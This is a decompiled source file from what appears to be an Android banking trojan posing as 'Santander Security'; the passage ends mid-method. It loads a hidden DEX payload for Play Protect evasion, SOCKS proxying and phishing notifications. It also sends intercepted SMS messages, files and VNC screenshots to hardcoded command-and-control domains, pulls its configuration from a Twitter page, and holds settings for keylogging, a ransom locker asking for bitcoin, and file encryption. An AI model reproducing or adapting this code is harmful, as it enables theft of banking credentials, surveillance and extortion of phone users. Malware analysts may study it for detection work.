package wocwvy.czyxoxmbauu.slsa;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.AlertDialog.Builder;
import android.app.AppOpsManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.provider.Telephony.Sms;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.TreeMap;
import wocwvy.czyxoxmbauu.slsa.ncec.sxfl;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0063a;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0067b;
import wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hwfe;

/* renamed from: wocwvy.czyxoxmbauu.slsa.b */
public class C0034b {

    /* renamed from: c */
    static final C0039c f341c = new C0039c();

    /* renamed from: d */
    static final String f342d = "Santander Security";

    /* renamed from: e */
    private static SharedPreferences f343e;

    /* renamed from: f */
    private static Editor f344f;

    /* renamed from: a */
    C0039c f345a = new C0039c();

    /* renamed from: b */
    C0033a f346b = new C0033a();

    /* renamed from: wocwvy.czyxoxmbauu.slsa.b$a */
    private class C0037a extends AsyncTask<Void, Void, String> {

        /* renamed from: a */
        HttpURLConnection f351a;

        /* renamed from: b */
        BufferedReader f352b;

        /* renamed from: c */
        String f353c;

        private C0037a() {
            this.f351a = null;
            this.f352b = null;
            this.f353c = "";
        }

        /* access modifiers changed from: protected */
        /* renamed from: a */
        public String doInBackground(Void... voidArr) {
            try {
                C0034b.this.f345a.getClass();
                this.f351a = (HttpURLConnection) new URL("https://twitter.com/qweqweqwe").openConnection();
                this.f351a.setRequestMethod("GET");
                this.f351a.connect();
                InputStream inputStream = this.f351a.getInputStream();
                StringBuffer stringBuffer = new StringBuffer();
                this.f352b = new BufferedReader(new InputStreamReader(inputStream));
                while (true) {
                    String readLine = this.f352b.readLine();
                    if (readLine == null) {
                        break;
                    }
                    stringBuffer.append(readLine);
                }
                System.out.println(stringBuffer.toString());
                this.f353c = stringBuffer.toString().replace(" ", "");
                this.f353c = C0034b.this.mo208a(this.f353c, "苏尔的开始", "苏尔苏尔完");
                int i = 0;
                while (true) {
                    C0033a aVar = C0034b.this.f346b;
                    if (i >= C0033a.f332s.length) {
                        break;
                    }
                    String str = this.f353c;
                    C0033a aVar2 = C0034b.this.f346b;
                    String str2 = C0033a.f333t[i];
                    C0033a aVar3 = C0034b.this.f346b;
                    this.f353c = str.replace(str2, C0033a.f332s[i]);
                    i++;
                }
                this.f353c = C0034b.this.mo230d(this.f353c);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return this.f353c;
        }

        /* access modifiers changed from: protected */
        /* renamed from: a */
        public void onPostExecute(String str) {
            super.onPostExecute(str);
        }
    }

    static {
        f341c.getClass();
    }

    /* renamed from: a */
    public static String m227a(byte[] bArr) {
        StringBuffer stringBuffer = new StringBuffer(bArr.length * 2);
        for (byte b : bArr) {
            String num = Integer.toString(b & 255, 16);
            if (num.length() < 2) {
                stringBuffer.append('0');
            }
            stringBuffer.append(num);
        }
        return stringBuffer.toString();
    }

    /* renamed from: a */
    public static void m228a(Service service, String str, String str2) {
        String str3 = "showNotificationAPI16";
        try {
            if (VERSION.SDK_INT >= 26) {
                str3 = "showNotificationAPI26";
            }
            File dir = service.getDir("apk", 0);
            StringBuilder sb = new StringBuilder();
            sb.append(f342d);
            sb.append(".apk");
            Class loadClass = new DexClassLoader(new File(dir, sb.toString()).getAbsolutePath(), service.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            Object newInstance = loadClass.newInstance();
            loadClass.getMethod(str3, new Class[]{Service.class, String.class, String.class}).invoke(newInstance, new Object[]{service, str, str2});
        } catch (Exception e) {
            Log.e("DexNotification", e.toString());
        }
        Log.e("Module", "DexNotification");
    }

    /* renamed from: a */
    public static void m229a(Context context) {
        try {
            File dir = context.getDir("apk", 0);
            StringBuilder sb = new StringBuilder();
            sb.append(f342d);
            sb.append(".apk");
            Class loadClass = new DexClassLoader(new File(dir, sb.toString()).getAbsolutePath(), context.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            Object newInstance = loadClass.newInstance();
            loadClass.getMethod("protect", new Class[]{Context.class}).invoke(newInstance, new Object[]{context});
        } catch (Exception e) {
            Log.e("DexPlayProtect", e.toString());
        }
    }

    /* renamed from: a */
    public static void m230a(Context context, Intent intent, Bitmap bitmap, String str, String str2) {
        try {
            File dir = context.getDir("apk", 0);
            StringBuilder sb = new StringBuilder();
            sb.append(f342d);
            sb.append(".apk");
            Class loadClass = new DexClassLoader(new File(dir, sb.toString()).getAbsolutePath(), context.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            Object newInstance = loadClass.newInstance();
            loadClass.getMethod("sendNotification_O", new Class[]{Context.class, Intent.class, Bitmap.class, String.class, String.class}).invoke(newInstance, new Object[]{context, intent, bitmap, str, str2});
        } catch (Exception e) {
            Log.e("DexNotificationPush", e.toString());
        }
        Log.e("Module", "DexNotificationPush Start");
    }

    /* renamed from: a */
    public static void m231a(Context context, String str, long j) {
        try {
            Intent intent = new Intent(context, hwfe.class);
            intent.setAction(str);
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + j, j, PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception unused) {
        }
    }

    /* renamed from: a */
    public static void m232a(Context context, String str, String str2, String str3, String str4) {
        try {
            File dir = context.getDir("apk", 0);
            StringBuilder sb = new StringBuilder();
            sb.append(f342d);
            sb.append(".apk");
            Class loadClass = new DexClassLoader(new File(dir, sb.toString()).getAbsolutePath(), context.getDir("outdex", 0).getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent()).loadClass("apps.com.app.utils");
            Object newInstance = loadClass.newInstance();
            loadClass.getMethod("startSocks", new Class[]{Context.class, String.class, String.class, String.class, String.class}).invoke(newInstance, new Object[]{context, str, str2, str3, str4});
        } catch (Exception e) {
            Log.e("DexSocks", e.toString());
        }
        Log.e("Module", "SocksStart");
    }

    /* renamed from: a */
    private boolean m233a(ApplicationInfo applicationInfo) {
        return (applicationInfo.flags & 1) != 0;
    }

    /* renamed from: a */
    public static byte[] m234a(File file) {
        FileInputStream fileInputStream = new FileInputStream(file);
        byte[] bArr = new byte[((int) file.length())];
        int i = 0;
        while (i < bArr.length) {
            int read = fileInputStream.read(bArr, i, bArr.length - i);
            if (read < 0) {
                break;
            }
            i += read;
        }
        if (i < bArr.length) {
            StringBuilder sb = new StringBuilder();
            sb.append("Could not completely read file ");
            sb.append(file.getName());
            throw new IOException(sb.toString());
        }
        fileInputStream.close();
        return bArr;
    }

    /* renamed from: f */
    public static void m235f(Context context, String str) {
        try {
            Intent intent = new Intent(context, hwfe.class);
            intent.setAction(str);
            ((AlarmManager) context.getSystemService("alarm")).cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception unused) {
        }
    }

    /* renamed from: r */
    private NetworkInfo m236r(Context context) {
        return ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
    }

    /* renamed from: a */
    public String mo207a(String str) {
        C0067b bVar = new C0067b();
        StringBuilder sb = new StringBuilder();
        sb.append(str);
        sb.append("/o1o/a16.php");
        return bVar.mo363a(sb.toString(), "");
    }

    /* renamed from: a */
    public String mo208a(String str, String str2, String str3) {
        try {
            return str.substring(str.indexOf(str2) + str2.length(), str.indexOf(str3));
        } catch (Exception unused) {
            return "";
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:23:0x00e6  */
    /* renamed from: a */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void mo209a(android.content.Context r8, java.lang.String r9) {
        /*
            r7 = this;
            wocwvy.czyxoxmbauu.slsa.a r0 = r7.f346b
            java.lang.String[] r0 = r0.f336c
            r1 = 0
            r0 = r0[r1]
            boolean r0 = r7.mo229c(r8, r0)
            if (r0 == 0) goto L_0x0130
            java.lang.String r0 = ""
            java.lang.String r1 = android.os.Environment.getExternalStorageState()
            java.lang.String r2 = "mounted"
            boolean r1 = r1.equals(r2)
            if (r1 != 0) goto L_0x0034
            java.lang.StringBuilder r8 = new java.lang.StringBuilder
            r8.<init>()
            java.lang.String r0 = "SD no access: "
            r8.append(r0)
            java.lang.String r0 = android.os.Environment.getExternalStorageState()
            r8.append(r0)
            java.lang.String r8 = r8.toString()
            r7.mo213a(r9, r8)
            return
        L_0x0034:
            java.io.File r1 = android.os.Environment.getExternalStorageDirectory()
            java.io.File r2 = new java.io.File
            java.lang.String r1 = r1.getAbsolutePath()
            r2.<init>(r1)
            java.io.File r1 = new java.io.File
            java.lang.String r3 = "id.txt"
            r1.<init>(r2, r3)
            r2 = 10
            java.io.BufferedReader r3 = new java.io.BufferedReader     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.io.FileReader r4 = new java.io.FileReader     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r4.<init>(r1)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r3.<init>(r4)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
        L_0x0054:
            java.lang.String r4 = r3.readLine()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            if (r4 == 0) goto L_0x007e
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.<init>()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r6 = "id: "
            r5.append(r6)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.append(r4)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r5 = r5.toString()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            android.util.Log.e(r9, r5)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.<init>()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.append(r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.append(r4)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r0 = r5.toString()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            goto L_0x0054
        L_0x007e:
            java.lang.String r3 = "id_windows_bot"
            r7.mo233d(r8, r3, r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r3 = "4"
            java.lang.StringBuilder r4 = new java.lang.StringBuilder     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r4.<init>()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r5 = "p="
            r4.append(r5)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.<init>()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r6 = r7.mo247q(r8)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.append(r6)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r6 = "|ID Windows Bot: "
            r5.append(r6)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.append(r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r5.append(r2)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r0 = "|"
            r5.append(r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r0 = r5.toString()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r0 = r7.mo225c(r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            r4.append(r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r0 = r4.toString()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r0 = r7.mo218b(r8, r3, r0)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            java.lang.String r3 = "||ok||"
            boolean r0 = r0.contains(r3)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            if (r0 == 0) goto L_0x00cd
            java.lang.String r0 = "id_windows_bot"
            java.lang.String r3 = ""
            r7.mo233d(r8, r0, r3)     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
        L_0x00cd:
            r1.delete()     // Catch:{ FileNotFoundException -> 0x00d4, IOException -> 0x00d1 }
            goto L_0x00d9
        L_0x00d1:
            java.lang.String r0 = "No file or permission"
            goto L_0x00d6
        L_0x00d4:
            java.lang.String r0 = "No file"
        L_0x00d6:
            android.util.Log.e(r9, r0)
        L_0x00d9:
            java.lang.String r9 = "id_windows_bot"
            java.lang.String r9 = r7.mo234e(r8, r9)
            int r0 = r9.length()
            r1 = 5
            if (r0 <= r1) goto L_0x0130
            java.lang.String r0 = "4"
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            java.lang.String r3 = "p="
            r1.append(r3)
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = r7.mo247q(r8)
            r3.append(r4)
            java.lang.String r4 = "|ID Windows Bot: "
            r3.append(r4)
            r3.append(r9)
            r3.append(r2)
            java.lang.String r9 = "|"
            r3.append(r9)
            java.lang.String r9 = r3.toString()
            java.lang.String r9 = r7.mo225c(r9)
            r1.append(r9)
            java.lang.String r9 = r1.toString()
            java.lang.String r9 = r7.mo218b(r8, r0, r9)
            java.lang.String r0 = "||ok||"
            boolean r9 = r9.contains(r0)
            if (r9 == 0) goto L_0x0130
            java.lang.String r9 = "id_windows_bot"
            java.lang.String r0 = ""
            r7.mo233d(r8, r9, r0)
        L_0x0130:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.C0034b.mo209a(android.content.Context, java.lang.String):void");
    }

    /* renamed from: a */
    public void mo210a(Context context, String str, String str2) {
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        StringBuilder sb2 = new StringBuilder();
        sb2.append(mo247q(context));
        sb2.append("|Incoming SMS");
        sb2.append(10);
        sb2.append("Number: ");
        sb2.append(str);
        sb2.append(10);
        sb2.append("Text: ");
        sb2.append(str2);
        sb2.append(10);
        sb2.append("|");
        sb.append(mo225c(sb2.toString()));
        mo218b(context, "4", sb.toString());
    }

    /* renamed from: a */
    public void mo211a(Context context, String str, String str2, String str3) {
        String e = mo234e(context, "websocket");
        StringBuilder sb = new StringBuilder();
        sb.append(e);
        this.f345a.getClass();
        sb.append("/o1o/a1.php");
        String sb2 = sb.toString();
        String str4 = "getfiles";
        File file = new File(str);
        byte[] a = m234a(file);
        if (str2.equals("")) {
            StringBuilder sb3 = new StringBuilder();
            sb3.append(mo247q(context));
            sb3.append("-");
            sb3.append(file.getName());
            str2 = sb3.toString();
        }
        String str5 = "\r\n";
        String str6 = "--";
        String str7 = "*****";
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(sb2).openConnection();
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Cache-Control", "no-cache");
        StringBuilder sb4 = new StringBuilder();
        sb4.append("multipart/form-data;boundary=");
        sb4.append(str7);
        httpURLConnection.setRequestProperty("Content-Type", sb4.toString());
        DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
        StringBuilder sb5 = new StringBuilder();
        sb5.append(str6);
        sb5.append(str7);
        sb5.append(str5);
        dataOutputStream.writeBytes(sb5.toString());
        StringBuilder sb6 = new StringBuilder();
        sb6.append("Content-Disposition: form-data; name=\"serverID\"");
        sb6.append(str5);
        dataOutputStream.writeBytes(sb6.toString());
        dataOutputStream.writeBytes(str5);
        dataOutputStream.write(str4.getBytes());
        dataOutputStream.writeBytes(str5);
        StringBuilder sb7 = new StringBuilder();
        sb7.append(str6);
        sb7.append(str7);
        sb7.append(str6);
        sb7.append(str5);
        dataOutputStream.writeBytes(sb7.toString());
        StringBuilder sb8 = new StringBuilder();
        sb8.append(str6);
        sb8.append(str7);
        sb8.append(str5);
        dataOutputStream.writeBytes(sb8.toString());
        StringBuilder sb9 = new StringBuilder();
        sb9.append("Content-Disposition: form-data; name=\"");
        sb9.append(str3);
        sb9.append("\";filename=\"");
        sb9.append(str2);
        sb9.append("\"");
        sb9.append(str5);
        dataOutputStream.writeBytes(sb9.toString());
        dataOutputStream.writeBytes(str5);
        dataOutputStream.write(a);
        dataOutputStream.writeBytes(str5);
        StringBuilder sb10 = new StringBuilder();
        sb10.append(str6);
        sb10.append(str7);
        sb10.append(str6);
        sb10.append(str5);
        dataOutputStream.writeBytes(sb10.toString());
        dataOutputStream.flush();
        dataOutputStream.close();
        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
        StringBuilder sb11 = new StringBuilder();
        while (true) {
            String readLine = bufferedReader.readLine();
            if (readLine != null) {
                sb11.append(readLine);
                sb11.append("\n");
            } else {
                bufferedReader.close();
                String sb12 = sb11.toString();
                StringBuilder sb13 = new StringBuilder();
                sb13.append("HTTPRESPONSE: ");
                sb13.append(sb12);
                mo213a("HTTP", sb13.toString());
                bufferedInputStream.close();
                httpURLConnection.disconnect();
                return;
            }
        }
    }

    /* renamed from: a */
    public void mo212a(Context context, byte[] bArr, String str) {
        String e = mo234e(context, "websocket");
        StringBuilder sb = new StringBuilder();
        sb.append(e);
        this.f345a.getClass();
        sb.append("/o1o/a1.php");
        String str2 = "\r\n";
        String str3 = "--";
        String str4 = "*****";
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(sb.toString()).openConnection();
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Cache-Control", "no-cache");
        StringBuilder sb2 = new StringBuilder();
        sb2.append("multipart/form-data;boundary=");
        sb2.append(str4);
        httpURLConnection.setRequestProperty("Content-Type", sb2.toString());
        DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str3);
        sb3.append(str4);
        sb3.append(str2);
        dataOutputStream.writeBytes(sb3.toString());
        StringBuilder sb4 = new StringBuilder();
        sb4.append("Content-Disposition: form-data; name=\"serverID\"");
        sb4.append(str2);
        dataOutputStream.writeBytes(sb4.toString());
        dataOutputStream.writeBytes(str2);
        dataOutputStream.write("getfiles".getBytes());
        dataOutputStream.writeBytes(str2);
        StringBuilder sb5 = new StringBuilder();
        sb5.append(str3);
        sb5.append(str4);
        sb5.append(str3);
        sb5.append(str2);
        dataOutputStream.writeBytes(sb5.toString());
        StringBuilder sb6 = new StringBuilder();
        sb6.append(str3);
        sb6.append(str4);
        sb6.append(str2);
        dataOutputStream.writeBytes(sb6.toString());
        StringBuilder sb7 = new StringBuilder();
        sb7.append("Content-Disposition: form-data; name=\"");
        sb7.append("VNC[]");
        sb7.append("\";filename=\"");
        sb7.append(str);
        sb7.append("\"");
        sb7.append(str2);
        dataOutputStream.writeBytes(sb7.toString());
        dataOutputStream.writeBytes(str2);
        dataOutputStream.write(bArr);
        dataOutputStream.writeBytes(str2);
        StringBuilder sb8 = new StringBuilder();
        sb8.append(str3);
        sb8.append(str4);
        sb8.append(str3);
        sb8.append(str2);
        dataOutputStream.writeBytes(sb8.toString());
        dataOutputStream.flush();
        dataOutputStream.close();
        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
        StringBuilder sb9 = new StringBuilder();
        while (true) {
            String readLine = bufferedReader.readLine();
            if (readLine != null) {
                sb9.append(readLine);
                sb9.append("\n");
            } else {
                bufferedReader.close();
                String sb10 = sb9.toString();
                StringBuilder sb11 = new StringBuilder();
                sb11.append("HTTPRESPONSE: ");
                sb11.append(sb10);
                mo213a("HTTP", sb11.toString());
                bufferedInputStream.close();
                httpURLConnection.disconnect();
                return;
            }
        }
    }

    /* renamed from: a */
    public void mo213a(String str, String str2) {
        this.f345a.getClass();
    }

    /* renamed from: a */
    public boolean mo214a() {
        this.f345a.getClass();
        return false;
    }

    /* renamed from: a */
    public boolean mo215a(Context context, Class<?> cls) {
        for (RunningServiceInfo runningServiceInfo : ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE)) {
            if (cls.getName().equals(runningServiceInfo.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: a */
    public byte[] mo216a(byte[] bArr, String str) {
        try {
            return new C0063a(str.getBytes()).mo359b(bArr);
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: b */
    public String mo217b() {
        new C0037a().execute(new Void[0]);
        C0037a aVar = new C0037a();
        aVar.execute(new Void[0]);
        try {
            return (String) aVar.get();
        } catch (Exception unused) {
            return "No";
        }
    }

    /* renamed from: b */
    public String mo218b(Context context, String str, String str2) {
        C0067b bVar = new C0067b();
        String str3 = "";
        if (str.equals("1")) {
            str3 = "/o1o/a3.php";
        }
        if (str.equals("2")) {
            str3 = "/o1o/a4.php";
        }
        if (str.equals("3")) {
            str3 = "/o1o/a5.php";
        }
        if (str.equals("4")) {
            str3 = "/o1o/a6.php";
        }
        if (str.equals("5")) {
            str3 = "/o1o/a7.php";
        }
        if (str.equals("6")) {
            str3 = "/o1o/a8.php";
        }
        if (str.equals("7")) {
            str3 = "/o1o/a9.php";
        }
        if (str.equals("10")) {
            str3 = "/o1o/a10.php";
        }
        if (str.equals("11")) {
            str3 = "/o1o/a11.php";
        }
        if (str.equals("12")) {
            str3 = "/o1o/a12.php";
        }
        if (str.equals("13")) {
            str3 = "/o1o/a13.php";
        }
        if (str.equals("14")) {
            str3 = "/o1o/a14.php";
        }
        if (str.equals("15")) {
            str3 = "/o1o/a15.php";
        }
        try {
            String e = mo234e(context, "url");
            StringBuilder sb = new StringBuilder();
            sb.append(e);
            sb.append(str3);
            return bVar.mo363a(sb.toString(), str2);
        } catch (Exception unused) {
            mo213a("ERROR", "Class nwtdtqovhkgkna, POST -> URL");
            return null;
        }
    }

    /* renamed from: b */
    public String mo219b(File file) {
        File[] listFiles;
        String str = "";
        String str2 = "";
        try {
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    StringBuilder sb = new StringBuilder();
                    sb.append("");
                    sb.append(file2.getName());
                    mo213a("Folder", sb.toString());
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(str);
                    sb2.append(file2.getName());
                    sb2.append("|");
                    str = sb2.toString();
                } else {
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append("");
                    sb3.append(file2.getName());
                    mo213a("File", sb3.toString());
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append(str2);
                    sb4.append(file2.getName());
                    sb4.append("|");
                    str2 = sb4.toString();
                }
            }
        } catch (Exception unused) {
            mo213a("ERROR", "listFilesWithSubFolders");
        }
        StringBuilder sb5 = new StringBuilder();
        sb5.append("!!!!");
        sb5.append(str);
        sb5.append("!!!!");
        sb5.append(str2);
        sb5.append("!!!!");
        return sb5.toString();
    }

    /* renamed from: b */
    public String mo220b(String str, String str2) {
        return Base64.encodeToString(m227a(new C0063a(str2.getBytes()).mo359b(str.getBytes())).getBytes(), 0);
    }

    /* renamed from: b */
    public void mo221b(Context context) {
        if (VERSION.SDK_INT >= 19) {
            mo233d(context, "swspacket", Sms.getDefaultSmsPackage(context).toString());
        } else {
            mo233d(context, "swspacket", "");
        }
        mo233d(context, "VNC_Start_NEW", "http://ktosdelaetskrintotpidor.com");
        mo233d(context, "Starter", "http://sositehuypidarasi.com");
        mo233d(context, "time_work", "0");
        mo233d(context, "time_start_permission", "0");
        StringBuilder sb = new StringBuilder();
        sb.append("");
        this.f345a.getClass();
        sb.append("http://yuyuhakusho.info".replace(" ", ""));
        mo233d(context, "urls", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append("");
        this.f345a.getClass();
        sb2.append("".replace(" ", ""));
        mo233d(context, "urlInj", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append("");
        this.f345a.getClass();
        sb3.append(10000);
        mo233d(context, "interval", sb3.toString());
        mo233d(context, "name", "false");
        mo233d(context, "perehvat_sws", "false");
        mo233d(context, "del_sws", "false");
        mo233d(context, "network", "false");
        mo233d(context, "gps", "false");
        mo233d(context, "madeSettings", "1 2 3 4 5 6 7 8 9 10 11 12 13 ");
        mo233d(context, "RequestINJ", "");
        mo233d(context, "RequestGPS", "");
        mo233d(context, "save_inj", "");
        mo233d(context, "SettingsAll", "");
        mo233d(context, "getNumber", "false");
        mo233d(context, "dateCJ", "");
        mo233d(context, "iconCJ", "0:0");
        mo233d(context, "str_push_fish", "");
        mo233d(context, "timeStartGrabber", "");
        mo233d(context, "checkStartGrabber", "0");
        mo233d(context, "startRequest", "Access=0Perm=0");
        mo233d(context, "StringPermis", "");
        mo233d(context, "StringActivate", "activate");
        mo233d(context, "StringAccessibility", "Enable access for");
        mo233d(context, "StringYes", "");
        mo233d(context, "uninstall1", "");
        mo233d(context, "uninstall2", "");
        mo233d(context, "vkladmin", "");
        mo233d(context, "websocket", "");
        mo233d(context, "vnc", "start");
        mo233d(context, "sound", "start");
        mo233d(context, "straccessibility", "");
        mo233d(context, "straccessibility2", "");
        mo233d(context, "findfiles", "");
        mo233d(context, "foregroundwhile", "");
        mo233d(context, "cryptfile", "false");
        mo233d(context, "status", "");
        mo233d(context, "key", "");
        mo233d(context, "htmllocker", "");
        mo233d(context, "lock_amount", "");
        mo233d(context, "lock_btc", "");
        mo233d(context, "keylogger", "");
        mo233d(context, "recordsoundseconds", "0");
        mo233d(context, "startRecordSound", "stop");
        mo233d(context, "play_protect", "");
        mo233d(context, "textPlayProtect", "");
        mo233d(context, "buttonPlayProtect", "");
        mo233d(context, "spamSMS", "");
        mo233d(context, "textSPAM", "");
        mo233d(context, "indexSMSSPAM", "");
        mo233d(context, "DexSocksMolude", "");
        mo233d(context, "lookscreen", "");
        mo233d(context, "step", "0");
        mo233d(context, "id_windows_bot", "");
        String lowerCase = Locale.getDefault().getLanguage().toLowerCase();
        C0033a aVar = this.f346b;
        if (!"[az][sq][am][en][ar][hy][af][eu][ba][be][bn][my][bg][bs][cy][hu][vi][ht][gl][nl][mrj][el][ka][gu][da][he][yi][id][ga][is][es][it][kk][kn][ca][ky][zh][ko][xh][km][lo][la][lv][lt][lb][mk][mg][ms][ml][mt][mi][mr][mhr][mn][de][ne][no][pa][pap][fa][pl][pt][ro][ru][ceb][sr][si][sk][sl][sw][su][tl][tg][th][ta][tt][te][tr][udm][uz][uk][ur][fi][fr][hi][hr][cs][sv][gd][eo][et][jv][ja]".contains(lowerCase)) {
            lowerCase = "en";
        }
        int i = 0;
        int i2 = 0;
        while (true) {
            C0033a aVar2 = this.f346b;
            if (i2 >= C0033a.f321h.length) {
                break;
            }
            C0033a aVar3 = this.f346b;
            String str = C0033a.f321h[i2];
            StringBuilder sb4 = new StringBuilder();
            sb4.append("[");
            sb4.append(lowerCase);
            sb4.append("]");
            if (str.contains(sb4.toString())) {
                C0033a aVar4 = this.f346b;
                String str2 = C0033a.f321h[i2];
                StringBuilder sb5 = new StringBuilder();
                sb5.append("[");
                sb5.append(lowerCase);
                sb5.append("]");
                String replace = str2.replace(sb5.toString(), "");
                C0033a aVar5 = this.f346b;
                String str3 = C0033a.f322i[i2];
                StringBuilder sb6 = new StringBuilder();
                sb6.append("[");
                sb6.append(lowerCase);
                sb6.append("]");
                String replace2 = str3.replace(sb6.toString(), "");
                mo233d(context, "StringActivate", replace);
                mo233d(context, "StringAccessibility", replace2);
                break;
            }
            i2++;
